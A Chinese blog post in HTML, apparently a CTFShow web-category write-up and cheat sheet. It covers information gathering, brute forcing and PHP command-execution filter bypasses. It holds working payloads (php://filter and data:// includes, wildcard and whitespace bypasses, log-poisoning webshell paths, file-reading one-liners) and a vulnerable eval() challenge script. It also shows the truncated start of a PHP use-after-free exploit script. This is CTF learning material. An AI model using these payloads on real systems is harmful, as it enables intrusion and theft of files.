@@ -1,0 +1,1005 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+    <head>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="robots" content="noodp" />
+        <title>CTFShow-web入门（1） - Hannibal0x の Blog</title><meta name="Description" content="Hannibal0x的个人学习博客"><meta property="og:title" content="CTFShow-web入门（1）" />
+<meta property="og:description" content="0x00 信息搜集 列举常见的信息搜集手法 查看源代码 ctrl&#43;shift&#43;i 查看响应包的headers 查看robots.txt 下载phps源码 下载目录源码，如：www.zi" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://hannibal0x.github.io/2022-03-01-ctfshow-web%E5%85%A5%E9%97%A81/" /><meta property="og:image" content="https://hannibal0x.github.io/images/logo.png"/><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2022-03-01T05:46:09+00:00" />
+<meta property="article:modified_time" content="2022-03-01T05:46:09+00:00" /><meta property="og:site_name" content="Hannibal0x の Blog" />
+
+<meta name="twitter:card" content="summary_large_image"/>
+<meta name="twitter:image" content="https://hannibal0x.github.io/images/logo.png"/>
+
+<meta name="twitter:title" content="CTFShow-web入门（1）"/>
+<meta name="twitter:description" content="0x00 信息搜集 列举常见的信息搜集手法 查看源代码 ctrl&#43;shift&#43;i 查看响应包的headers 查看robots.txt 下载phps源码 下载目录源码，如：www.zi"/>
+<meta name="application-name" content="Hannibal0x の Blog">
+<meta name="apple-mobile-web-app-title" content="Hannibal0x の Blog"><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="icon" href="/images/logo.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="https://hannibal0x.github.io/2022-03-01-ctfshow-web%E5%85%A5%E9%97%A81/" /><link rel="prev" href="https://hannibal0x.github.io/2022-02-28-2%E6%9C%88ctf%E7%BB%83%E4%B9%A0/" /><link rel="next" href="https://hannibal0x.github.io/2022-03-28-ctf%E7%BB%83%E4%B9%A0week1/" /><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" href="/lib/fontawesome-free/all.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+        <noscript><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"></noscript><link rel="preload" href="/lib/animate/animate.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+        <noscript><link rel="stylesheet" href="/lib/animate/animate.min.css"></noscript><script type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "BlogPosting",
+        "headline": "CTFShow-web入门（1）",
+        "inLanguage": "zh-CN",
+        "mainEntityOfPage": {
+            "@type": "WebPage",
+            "@id": "https:\/\/hannibal0x.github.io\/2022-03-01-ctfshow-web%E5%85%A5%E9%97%A81\/"
+        },"genre": "posts","keywords": "CTF, Web安全","wordcount":  5981 ,
+        "url": "https:\/\/hannibal0x.github.io\/2022-03-01-ctfshow-web%E5%85%A5%E9%97%A81\/","datePublished": "2022-03-01T05:46:09+00:00","dateModified": "2022-03-01T05:46:09+00:00","publisher": {
+            "@type": "Organization",
+            "name": ""},"author": {
+                "@type": "Person",
+                "name": "Hannibal0x"
+            },"description": ""
+    }
+    </script></head>
+    <body data-header-desktop="fixed" data-header-mobile="auto"><script type="text/javascript">(window.localStorage && localStorage.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('auto' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'auto' === 'dark')) && document.body.setAttribute('theme', 'dark');</script>
+
+        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
+    <div class="header-wrapper">
+        <div class="header-title">
+            <a href="/" title="Hannibal0x の Blog"><img
+        class="lazyload logo"
+        src="/svg/loading.min.svg"
+        data-src="/images/logo.png"
+        data-srcset="/images/logo.png, /images/logo.png 1.5x, /images/logo.png 2x"
+        data-sizes="auto"
+        alt="/images/logo.png"
+        title="/images/logo.png" width="32" height="32" />Hannibal0x の Blog</a>
+        </div>
+        <div class="menu">
+            <div class="menu-inner"><a class="menu-item" href="/posts/"><i class='fas fa-book'></i> 文章 </a><a class="menu-item" href="/tags/"><i class='fas fa-tags'></i> 标签 </a><a class="menu-item" href="/categories/"><i class='fas fa-folder'></i> 分类 </a><a class="menu-item" href="/categories/writeup"><i class='fas fa-flag'></i> CTF </a><a class="menu-item" href="/about/"><i class='fas fa-key'></i> 关于 </a><a class="menu-item" href="http://hannibal0x.top" rel="noopener noreffer" target="_blank"><i class='fas fa-history'></i> 旧博客 </a><span class="menu-item delimiter"></span><span class="menu-item search" id="search-desktop">
+                        <input type="text" placeholder="都几岁啦，还这么害羞，让我康康！" id="search-input-desktop">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="Search">
+                            <i class="fas fa-search fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="Clear">
+                            <i class="fas fa-times-circle fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-desktop">
+                            <i class="fas fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+                        </span>
+                    </span><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                    <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+                </a></div>
+        </div>
+    </div>
+</header><header class="mobile" id="header-mobile">
+    <div class="header-container">
+        <div class="header-wrapper">
+            <div class="header-title">
+                <a href="/" title="Hannibal0x の Blog"><img
+        class="lazyload logo"
+        src="/svg/loading.min.svg"
+        data-src="/images/logo.png"
+        data-srcset="/images/logo.png, /images/logo.png 1.5x, /images/logo.png 2x"
+        data-sizes="auto"
+        alt="/images/logo.png"
+        title="/images/logo.png" width="32" height="32" />Hannibal0x の Blog</a>
+            </div>
+            <div class="menu-toggle" id="menu-toggle-mobile">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+        <div class="menu" id="menu-mobile"><div class="search-wrapper">
+                    <div class="search mobile" id="search-mobile">
+                        <input type="text" placeholder="都几岁啦，还这么害羞，让我康康！" id="search-input-mobile">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="Search">
+                            <i class="fas fa-search fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="Clear">
+                            <i class="fas fa-times-circle fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-mobile">
+                            <i class="fas fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+                        </span>
+                    </div>
+                    <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
+                        Cancel
+                    </a>
+                </div><a class="menu-item" href="/posts/" title=""><i class='fas fa-book'></i>文章</a><a class="menu-item" href="/tags/" title=""><i class='fas fa-tags'></i>标签</a><a class="menu-item" href="/categories/" title=""><i class='fas fa-folder'></i>分类</a><a class="menu-item" href="/categories/writeup" title=""><i class='fas fa-flag'></i>CTF</a><a class="menu-item" href="/about/" title=""><i class='fas fa-key'></i>关于</a><a class="menu-item" href="http://hannibal0x.top" title="" rel="noopener noreffer" target="_blank"><i class='fas fa-history'></i>旧博客</a><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+            </a></div>
+    </div>
+</header><div class="search-dropdown desktop">
+        <div id="search-dropdown-desktop"></div>
+    </div>
+    <div class="search-dropdown mobile">
+        <div id="search-dropdown-mobile"></div>
+    </div><main class="main">
+                <div class="container"><div class="toc" id="toc-auto">
+            <h2 class="toc-title">Contents</h2>
+            <div class="toc-content" id="toc-content-auto"></div>
+        </div><article class="page single"><h1 class="single-title animate__animated animate__flipInX">CTFShow-web入门（1）</h1><div class="post-meta">
+            <div class="post-meta-line"><span class="post-author"><a href="/" title="Author" rel="author" class="author"><i class="fas fa-user-circle fa-fw" aria-hidden="true"></i>Hannibal0x</a></span>&nbsp;<span class="post-category">included in <a href="/categories/writeup/"><i class="far fa-folder fa-fw" aria-hidden="true"></i>WriteUp</a></span></div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw" aria-hidden="true"></i>&nbsp;<time datetime="2022-03-01">2022-03-01</time>&nbsp;<i class="fas fa-pencil-alt fa-fw" aria-hidden="true"></i>&nbsp;5981 words&nbsp;
+                <i class="far fa-clock fa-fw" aria-hidden="true"></i>&nbsp;12 minutes&nbsp;</div>
+        </div><div class="details toc" id="toc-static"  data-kept="">
+                <div class="details-summary toc-title">
+                    <span>Contents</span>
+                    <span><i class="details-icon fas fa-angle-right" aria-hidden="true"></i></span>
+                </div>
+                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#0x00-信息搜集">0x00 信息搜集</a></li>
+    <li><a href="#0x01-爆破">0x01 爆破</a></li>
+    <li><a href="#0x02-命令执行">0x02 命令执行</a></li>
+  </ul>
+</nav></div>
+            </div><div class="content" id="content"><div class="has-toc have-toc">
+</div>
+<h2 id="0x00-信息搜集">0x00 信息搜集</h2>
+<p>列举常见的信息搜集手法</p>
+<p>查看源代码</p>
+<p>ctrl+shift+i</p>
+<p>查看响应包的headers</p>
+<p>查看robots.txt</p>
+<p>下载phps源码</p>
+<p>下载目录源码，如：www.zip</p>
+<p>查看.git或.svn文件</p>
+<p>vim编辑时会产生一个filename.swp的文件，例如：index.php.swp</p>
+<p>查看cookie</p>
+<p>查看域名信息，可通过<a href="https://zijian.aliyun.com/" target="_blank" rel="noreferrer noopener" rel="nofollow" ><a href="https://zijian.aliyun.com/" target="_blank" rel="noopener noreffer ">https://zijian.aliyun.com/</a></a>等</p>
+<p>查看网页公开信息，比如电话号、QQ、邮箱</p>
+<p>查看公开技术文档</p>
+<p>小0day:KindEditor PHP默认配置下插入文件，如果目录不存在，则会遍历服务器根目录</p>
+<p>php探针是用来探测空间、服务器运行状况和PHP信息用的，探针可以实时查看服务器硬盘资源、内存占用、网卡 流量、系统负载、服务器时间等信息。 url后缀名添加/tz.php 版本是雅黑PHP探针</p>
+<p>数据库备份文件，如：backup.sql和/db/db.mdb</p>
+<p>查看加密算法及密钥</p>
+<h2 id="0x01-爆破">0x01 爆破</h2>
+<p>Custom iterator爆破，参考<a href="https://www.cnblogs.com/007NBqaq/p/13220297.html" target="_blank" rel="noreferrer noopener" rel="nofollow" ><a href="https://www.cnblogs.com/007NBqaq/p/13220297.html" target="_blank" rel="noopener noreffer ">https://www.cnblogs.com/007NBqaq/p/13220297.html</a></a></p>
+<p>子域名爆破</p>
+<p>根据php算法爆破token</p>
+<p>php伪随机数，种子预测随机数和随机数预测种子。<a rel="noreferrer noopener" href="https://blog.csdn.net/zss192/article/details/104327432" target="_blank" rel="nofollow" ><a href="https://blog.csdn.net/zss192/article/details/104327432" target="_blank" rel="noopener noreffer ">https://blog.csdn.net/zss192/article/details/104327432</a></a></p>
+<p>爆破身份证</p>
+<p>爆破文件目录，如/0/1/</p>
+<h2 id="0x02-命令执行">0x02 命令执行</h2>
+<p>通配符<code>?</code>和<code>*</code></p>
+<p>引号拼接，如：<code>fl''ag.php</code>，<code>fl&quot;&quot;ag.php</code></p>
+<p>\拼接，如：<code>fla\g.php</code></p>
+<p>可执行并直接显示结果的函数：<code>system</code>、<code>passthru</code></p>
+<p>需要echo显示结果的函数：反引号<code>`</code>、<code>exec</code>、<code>shell_exec</code></p>
+<p><a href="https://chybeta.github.io/2017/08/08/php%E4%BB%A3%E7%A0%81-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" target="_blank"  rel="nofollow" ><a href="https://chybeta.github.io/2017/08/08/php%E4%BB%A3%E7%A0%81-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" target="_blank" rel="noopener noreffer ">https://chybeta.github.io/2017/08/08/php%E4%BB%A3%E7%A0%81-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/</a></a></p>
+<p>cat被过滤时，常见读文件命令</p>
+<pre class="wp-block-code"><code>curl命令读文件
+
+strings:查找可打印的字符串
+rev:反转查看内容
+more/less:一页一页的显示内容
+head:查看头几行   tail:查看尾几行
+tac:从最后一行开始显示
+nl：显示的时候，顺便输出行号
+sort:将文本文件内容加以排序
+uniq:检查文本文件中重复出现的行列
+vi/vim:编辑器查看
+grep:查找文件里符合条件的字符串
+
+awk:处理文本文件
+  NF   每一行拥有的字段总数
+  NR   目前处理的是第几行的数据
+  FS   目前的分隔字符
+awk    '条件{命令}'   文件
+常用payload:awk 'NR&lt;10{print $1"\t"$2"\t"$3}' flag
+把flag文件中的前10行的第1、2、3列的数据列出来 （以&#91;tab]或空格键分隔）
+
+sed:处理文本文件
+sed    '命令'   文件
+常用payload:sed '1,10d' flag
+查看flag文件1~10行的内容
+
+bash -v:打印整个文件后执行
+file -f:指定名称文件，其内容有一个或多个文件名称时，让file依序辨识这些文件，格式为每列一个文件名称。
+
+od:以二进制的方式读取内容
+-A 指定地址进制包括：
+    o 八进制（系统默认值）
+    d 十进制
+    x 十六进制
+    n 不打印位移值
+-t 指定数据的显示格式，主要参数有：
+    c ASCII字符或反斜杠序列(如\n)
+    d 有符号十进制数
+    f 浮点数
+    o 八进制（系统默认值）
+    u 无符号十进制数
+    x 十六进制数
+
+cut:用于显示每行从开头算起 num1 到 num2 的文字
+-b ：以字节为单位进行分割。这些字节位置将忽略多字节字符边界，除非也指定了 -n 标志。
+-c ：以字符为单位进行分割。</code></pre>
+<p>花式读文件：<a href="https://www.cnblogs.com/linuxsec/articles/10741588.html" target="_blank" rel="noreferrer noopener" rel="nofollow" ><a href="https://www.cnblogs.com/linuxsec/articles/10741588.html" target="_blank" rel="noopener noreffer ">https://www.cnblogs.com/linuxsec/articles/10741588.html</a></a></p>
+<p>php函数操作：</p>
+<pre class="wp-block-code"><code>scandir('.') 扫描当前目录
+localeconv() 函数返回一数组。而数组第一项就是.(用来绕过.过滤)
+pos()/current() 返回数组第一个值</code></pre>
+<p>数组操作函数：</p>
+<pre class="wp-block-code"><code>end() 数组指针指向最后一位
+next() 数组指针指向下一位
+array_reverse() 将数组颠倒
+array_rand() 随机返回数组的键名
+array_flip() 交换数组的键和值</code></pre>
+<p>读取文件函数：<code>file_get_content()</code> 、<code>readfile()</code>、<code>highlight_file()</code>、<code>show_source()</code>、<code>var_dump(file('filename'))</code>、<code>print_r(file('filename'))</code></p>
+<p>一些情况下也可通过<code>include</code>、<code>require</code>、<code>include_once</code>、<code>require_once</code>读取文件内容。</p>
+<p>过滤分号时可以使用<code>?&gt;</code>替代<code>;</code></p>
+<p>过滤括号时可以使用<code>include</code>和伪协议的配合</p>
+<pre class="wp-block-code"><code>因为include包含php文件不会在页面显示出来
+所以可以配合伪协议将flag.php打印,而且新的参数不会受过滤影响</code></pre>
+<p>常用payload:</p>
+<pre class="wp-block-code"><code>c=include$_GET&#91;"a"]?&gt;&a=php://filter/read=convert.base64-encode/resource=flag.php
+c=include$_GET&#91;'a']?&gt;&a=data://text/plain,&lt;?php system("cat flag.php");?&gt;
+c=include$_GET&#91;a]?&gt;&a=data://text/plain;base64,PD9waHAgc3lzdGVtKCJjYXQgZmxhZy5waHAiKTs/Pg==</code></pre>
+<p>日志包含获取Shell，如果访问一个不存在的资源时，如http://www.xxxx.com/<?php phpinfo(); ?>,则会记录在日志中，但是代码中的敏感字符会被浏览器转码，可以通过burpsuit绕过编码写入apache的日志文件，前提是得知道日志文件的存储路径。</p>
+<p>日志默认路径</p>
+<pre class="wp-block-code"><code>(1) apache+Linux日志默认路径
+/etc/httpd/logs/access.log或者/var/log/httpd/access.log
+n
+(2) apache+win2003日志默认路径
+D:\xampp\apache\logs\access.log或者D:\xampp\apache\logs\error.log
+
+(3) IIS6.0+win2003默认日志文件
+C:\WINDOWS\system32\Logfiles
+
+(4) IIS7.0+win2003 默认日志文件
+%SystemDrive%\inetpub\logs\LogFiles
+
+(5) nginx 日志文件
+日志文件在用户安装目录logs目录下，如/usr/local/nginx,日志目录为/usr/local/nginx/logs</code></pre>
+<p>通过<code>.php</code>后缀限制<code>include</code>时，使用<code>data://text/plain</code>, 相当于执行了php语句，因为前面的php语句已经闭合了，所以后面的<code>.php</code>会被当成html页面直接显示。</p>
+<p>无字母数字绕过正则表达式总结脚本：<a href="https://blog.csdn.net/miuzzx/article/details/109143413" target="_blank"  rel="nofollow" ><a href="https://blog.csdn.net/miuzzx/article/details/109143413" target="_blank" rel="noopener noreffer ">https://blog.csdn.net/miuzzx/article/details/109143413</a></a></p>
+<p>一些不包含数字和字母的webshell：<a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html" target="_blank"  rel="nofollow" ><a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html" target="_blank" rel="noopener noreffer ">https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html</a></a></p>
+<p>无字母数字webshell之提高篇：<a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html" target="_blank" rel="noreferrer noopener" rel="nofollow" ><a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html" target="_blank" rel="noopener noreffer ">https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html</a></a></p>
+<p><code>session_id()</code>结合<code>PHPSESSID</code>，受php版本影响 5.5 -7.1.9均可以执行，<code>session_id</code>规定为0-9，a-z,A-Z,-中的字符。</p>
+<p>命令分隔</p>
+<pre class="wp-block-code"><code>换行符     %0a
+回车符     %0d
+连续指令   ;
+后台进程   &（编码%26）
+管道符     |
+(逻辑?)    ||  &&
+
+windows中：%1a（作为.bat文件中的命令分隔符）</code></pre>
+<p>空格绕过</p>
+<pre class="wp-block-code"><code>>、&lt;、&lt;>   //重定向符,通常结合nl等命令使用
+%09(需要php环境,tab)
+${IFS}
+$IFS
+$IFS$9
+,    //用逗号实现了空格功能
+%20</code></pre>
+<p>过滤字母时可用payload:c=<code>/???/????64 ????.???</code>读取flag.php，bin目录为binary的简写，主要放置一些 系统的必备执行档例如:cat、cp、chmod df、dmesg、gzip、kill、ls、mkdir、more、mount、rm、su、tar、base64等，这里可以利用 base64 中的64 进行通配符匹配，即/bin/base64 flag.php。</p>
+<p>另一种payload:c=<code>/???/???/????2 ????.???</code>，可通过/usr/bin目录，常包括例如c++、g++、gcc、chdrv、diff、dig、du、eject、elm、free、gnome、 zip、htpasswd、kfm、ktop、last、less、locale、m4、make、man、mcopy、ncftp、 newaliases、nslookup passwd、quota、smb、wget等，可以利用/usr/bin下的bzip2将flag.php文件进行压缩，然后再下载。</p>
+<p>构造数字，<code>$(( ))</code>与整数运算</p>
+<pre class="wp-block-code"><code>$(())---------是0
+$((~$(())))---是-1
+$((~$(())))$((~$(())))---是-1-1
+$(($((~$(())))$((~$(())))))---是-2
+
+同时$((~-a))=a-1，如：$((~-5))=4
+$((~a))=-a-1，如：$((~5))=-6</code></pre>
+<p id="block-6c7ae655-d855-4388-ae1b-c8634a7119a8">
+  通过fopen去读取文件内容
+</p>
+<pre class="wp-block-code"><code>fread()
+fgets()
+fgetc()
+fgetss()//This function has been DEPRECATED as of PHP 7.3.0, and REMOVED as of PHP 8.0.0
+fgetcsv()
+fpassthru()
+<p>对应payload:
+c=$a=fopen(&ldquo;flag.php&rdquo;,&ldquo;r&rdquo;);while (!feof($a)) {$line = fread($a,filesize(&ldquo;flag.php&rdquo;));echo $line;}</p>
+<p>c=$a=fopen(&ldquo;flag.php&rdquo;,&ldquo;r&rdquo;);while (!feof($a)) {$line = fgets($a);echo $line;}//一行一行读取</p>
+<p>c=$a=fopen(&ldquo;flag.php&rdquo;,&ldquo;r&rdquo;);while (!feof($a)) {$line = fgetc($a);echo $line;}//一个一个字符读取</p>
+<p>c=$a=fopen(&ldquo;flag.php&rdquo;,&ldquo;r&rdquo;);while (!feof($a)) {$line = fgetss($a);echo $line;}</p>
+<p>//php7.3.0版本后 该函数已不再被使用</p>
+<p>c=$a=fopen(&ldquo;flag.php&rdquo;,&ldquo;r&rdquo;);while (!feof($a)) {$line = fgetcsv($a);var_dump($line);}</p>
+<p>c=$a=fopen(&ldquo;flag.php&rdquo;,&ldquo;r&rdquo;);while (!feof($a)) {$line = fpassthru($a);echo $line;}</code></pre></p>
+<p>常用获取文件路径的函数组合</p>
+<pre class="wp-block-code"><code>c=print_r(scandir(current(localeconv())));
+
+c=print_r(scandir(dirname('__FILE__')));
+
+c=$a=new DirectoryIterator('glob:///var/www/html/*');foreach($a as $f){echo($f->__toString()." ");}
+
+c=$a=opendir("./"); while (($file = readdir($a)) !== false){echo $file . "&lt;br>"; };</code></pre>
+<p>通过<code>copy()</code>和<code>rename()</code>，复制文件内容后，访问url/flag.txt，如：<code>copy(&quot;flag.php&quot;,&quot;flag.txt&quot;);rename(&quot;flag.php&quot;,&quot;flag.txt&quot;);</code></p>
+<pre class="wp-block-code"><code>&lt;?php
+
+error_reporting(0);
+ini_set('display_errors', 0);
+// 你们在炫技吗？
+if(isset($_POST&#91;'c'])){
+        $c= $_POST&#91;'c'];
+        eval($c);
+        $s = ob_get_contents();
+        ob_end_clean();
+        echo preg_replace("/&#91;0-9]|&#91;a-z]/i","?",$s);
+}else{
+    highlight_file(__FILE__);
+}
+?>
+
+ob_get_contents — 返回输出缓冲区的内容
+ob_end_clean — 会清除缓冲区的内容，并将缓冲区关闭，但不会输出内容</code></pre>
+<p>通过<code>exit();</code>使程序提前退出，绕过后面的正则表达式。</p>
+<p>如果open_basedir 限制了访问路径，可以先找到文件。</p>
+<pre class="wp-block-code"><code>c=?>&lt;?php $a=new DirectoryIterator("glob://./*");
+foreach($a as $f)
+{echo($f->__toString().' ');
+}
+exit(0);
+?></code></pre>
+<p>然后使用群主提供的uaf脚本</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">  1
+</span><span class="lnt">  2
+</span><span class="lnt">  3
+</span><span class="lnt">  4
+</span><span class="lnt">  5
+</span><span class="lnt">  6
+</span><span class="lnt">  7
+</span><span class="lnt">  8
+</span><span class="lnt">  9
+</span><span class="lnt"> 10
+</span><span class="lnt"> 11
+</span><span class="lnt"> 12
+</span><span class="lnt"> 13
+</span><span class="lnt"> 14
+</span><span class="lnt"> 15
+</span><span class="lnt"> 16
+</span><span class="lnt"> 17
+</span><span class="lnt"> 18
+</span><span class="lnt"> 19
+</span><span class="lnt"> 20
+</span><span class="lnt"> 21
+</span><span class="lnt"> 22
+</span><span class="lnt"> 23
+</span><span class="lnt"> 24
+</span><span class="lnt"> 25
+</span><span class="lnt"> 26
+</span><span class="lnt"> 27
+</span><span class="lnt"> 28
+</span><span class="lnt"> 29
+</span><span class="lnt"> 30
+</span><span class="lnt"> 31
+</span><span class="lnt"> 32
+</span><span class="lnt"> 33
+</span><span class="lnt"> 34
+</span><span class="lnt"> 35
+</span><span class="lnt"> 36
+</span><span class="lnt"> 37
+</span><span class="lnt"> 38
+</span><span class="lnt"> 39
+</span><span class="lnt"> 40
+</span><span class="lnt"> 41
+</span><span class="lnt"> 42
+</span><span class="lnt"> 43
+</span><span class="lnt"> 44
+</span><span class="lnt"> 45
+</span><span class="lnt"> 46
+</span><span class="lnt"> 47
+</span><span class="lnt"> 48
+</span><span class="lnt"> 49
+</span><span class="lnt"> 50
+</span><span class="lnt"> 51
+</span><span class="lnt"> 52
+</span><span class="lnt"> 53
+</span><span class="lnt"> 54
+</span><span class="lnt"> 55
+</span><span class="lnt"> 56
+</span><span class="lnt"> 57
+</span><span class="lnt"> 58
+</span><span class="lnt"> 59
+</span><span class="lnt"> 60
+</span><span class="lnt"> 61
+</span><span class="lnt"> 62
+</span><span class="lnt"> 63
+</span><span class="lnt"> 64
+</span><span class="lnt"> 65
+</span><span class="lnt"> 66
+</span><span class="lnt"> 67
+</span><span class="lnt"> 68
+</span><span class="lnt"> 69
+</span><span class="lnt"> 70
+</span><span class="lnt"> 71
+</span><span class="lnt"> 72
+</span><span class="lnt"> 73
+</span><span class="lnt"> 74
+</span><span class="lnt"> 75
+</span><span class="lnt"> 76
+</span><span class="lnt"> 77
+</span><span class="lnt"> 78
+</span><span class="lnt"> 79
+</span><span class="lnt"> 80
+</span><span class="lnt"> 81
+</span><span class="lnt"> 82
+</span><span class="lnt"> 83
+</span><span class="lnt"> 84
+</span><span class="lnt"> 85
+</span><span class="lnt"> 86
+</span><span class="lnt"> 87
+</span><span class="lnt"> 88
+</span><span class="lnt"> 89
+</span><span class="lnt"> 90
+</span><span class="lnt"> 91
+</span><span class="lnt"> 92
+</span><span class="lnt"> 93
+</span><span class="lnt"> 94
+</span><span class="lnt"> 95
+</span><span class="lnt"> 96
+</span><span class="lnt"> 97
+</span><span class="lnt"> 98
+</span><span class="lnt"> 99
+</span><span class="lnt">100
+</span><span class="lnt">101
+</span><span class="lnt">102
+</span><span class="lnt">103
+</span><span class="lnt">104
+</span><span class="lnt">105
+</span><span class="lnt">106
+</span><span class="lnt">107
+</span><span class="lnt">108
+</span><span class="lnt">109
+</span><span class="lnt">110
+</span><span class="lnt">111
+</span><span class="lnt">112
+</span><span class="lnt">113
+</span><span class="lnt">114
+</span><span class="lnt">115
+</span><span class="lnt">116
+</span><span class="lnt">117
+</span><span class="lnt">118
+</span><span class="lnt">119
+</span><span class="lnt">120
+</span><span class="lnt">121
+</span><span class="lnt">122
+</span><span class="lnt">123
+</span><span class="lnt">124
+</span><span class="lnt">125
+</span><span class="lnt">126
+</span><span class="lnt">127
+</span><span class="lnt">128
+</span><span class="lnt">129
+</span><span class="lnt">130
+</span><span class="lnt">131
+</span><span class="lnt">132
+</span><span class="lnt">133
+</span><span class="lnt">134
+</span><span class="lnt">135
+</span><span class="lnt">136
+</span><span class="lnt">137
+</span><span class="lnt">138
+</span><span class="lnt">139
+</span><span class="lnt">140
+</span><span class="lnt">141
+</span><span class="lnt">142
+</span><span class="lnt">143
+</span><span class="lnt">144
+</span><span class="lnt">145
+</span><span class="lnt">146
+</span><span class="lnt">147
+</span><span class="lnt">148
+</span><span class="lnt">149
+</span><span class="lnt">150
+</span><span class="lnt">151
+</span><span class="lnt">152
+</span><span class="lnt">153
+</span><span class="lnt">154
+</span><span class="lnt">155
+</span><span class="lnt">156
+</span><span class="lnt">157
+</span><span class="lnt">158
+</span><span class="lnt">159
+</span><span class="lnt">160
+</span><span class="lnt">161
+</span><span class="lnt">162
+</span><span class="lnt">163
+</span><span class="lnt">164
+</span><span class="lnt">165
+</span><span class="lnt">166
+</span><span class="lnt">167
+</span><span class="lnt">168
+</span><span class="lnt">169
+</span><span class="lnt">170
+</span><span class="lnt">171
+</span><span class="lnt">172
+</span><span class="lnt">173
+</span><span class="lnt">174
+</span><span class="lnt">175
+</span><span class="lnt">176
+</span><span class="lnt">177
+</span><span class="lnt">178
+</span><span class="lnt">179
+</span><span class="lnt">180
+</span><span class="lnt">181
+</span><span class="lnt">182
+</span><span class="lnt">183
+</span><span class="lnt">184
+</span><span class="lnt">185
+</span><span class="lnt">186
+</span><span class="lnt">187
+</span><span class="lnt">188
+</span><span class="lnt">189
+</span><span class="lnt">190
+</span><span class="lnt">191
+</span><span class="lnt">192
+</span><span class="lnt">193
+</span><span class="lnt">194
+</span><span class="lnt">195
+</span><span class="lnt">196
+</span><span class="lnt">197
+</span><span class="lnt">198
+</span><span class="lnt">199
+</span><span class="lnt">200
+</span><span class="lnt">201
+</span><span class="lnt">202
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">c=function ctfshow($cmd) {
+</span></span><span class="line"><span class="cl">    global $abc, $helper, $backtrace;
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    class Vuln {
+</span></span><span class="line"><span class="cl">        public $a;
+</span></span><span class="line"><span class="cl">        public function __destruct() { 
+</span></span><span class="line"><span class="cl">            global $backtrace; 
+</span></span><span class="line"><span class="cl">            unset($this-&gt;a);
+</span></span><span class="line"><span class="cl">            $backtrace = (new Exception)-&gt;getTrace();
+</span></span><span class="line"><span class="cl">            if(!isset($backtrace[1][&#39;args&#39;])) {
+</span></span><span class="line"><span class="cl">                $backtrace = debug_backtrace();
+</span></span><span class="line"><span class="cl">            }
+</span></span><span class="line"><span class="cl">        }
+</span></span><span class="line"><span class="cl">    }
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    class Helper {
+</span></span><span class="line"><span class="cl">        public $a, $b, $c, $d;
+</span></span><span class="line"><span class="cl">    }
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    function str2ptr(&amp;$str, $p = 0, $s = 8) {
+</span></span><span class="line"><span class="cl">        $address = 0;
+</span></span><span class="line"><span class="cl">        for($j = $s-1; $j &gt;= 0; $j--) {
+</span></span><span class="line"><span class="cl">            $address &lt;&lt;= 8;
+</span></span><span class="line"><span class="cl">            $address |= ord($str[$p+$j]);
+</span></span><span class="line"><span class="cl">        }
+</span></span><span class="line"><span class="cl">        return $address;
+</span></span><span class="line"><span class="cl">    }
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    function ptr2str($ptr, $m = 8) {
+</span></span><span class="line"><span class="cl">        $out = &#34;&#34;;
+</span></span><span class="line"><span class="cl">        for ($i=0; $i &lt; $m; $i++) {
+</span></span><span class="line"><span class="cl">            $out .= sprintf(&#34;%c&#34;,($ptr &amp; 0xff));
